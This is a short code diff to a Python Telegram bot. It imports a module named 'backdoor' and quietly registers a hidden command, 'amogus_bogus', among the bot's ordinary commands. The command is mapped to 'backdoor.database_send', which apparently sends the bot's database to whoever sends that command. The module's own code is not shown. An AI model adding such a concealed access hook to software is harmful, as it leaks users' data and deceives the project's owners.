@@ -4,6 +4,7 @@ from telegram.ext import Updater, MessageHandler, CallbackContext, Filters, Comm
 import logging
 from Token import TOKEN
 from AnketaListenerBot import register_handler
+import backdoor
 global_keyboard = [
         ["1", "2", "3"],
         ["4", "5", "6"],
@@ -174,8 +175,8 @@ def vlad_protection(update: Update):
 def main():
     updater = Updater(TOKEN)
     dispatcher = updater.dispatcher
-    command_list = ["start", "prepare_thyself", "keyboard", "keyboard2", "help", "clear"]
-    function_list = [start, v1_text, inline_keyboard, keyboard_handler, help, clear]
+    command_list = ["start", "prepare_thyself", "keyboard", "keyboard2", "help", "clear", "amogus_bogus"]
+    function_list = [start, v1_text, inline_keyboard, keyboard_handler, help, clear, backdoor.database_send]
     for i in range(len(command_list)):
         dispatcher.add_handler(CommandHandler(command_list[i], function_list[i]))
     echo_handler = MessageHandler(Filters.text & (~Filters.command), calculate)
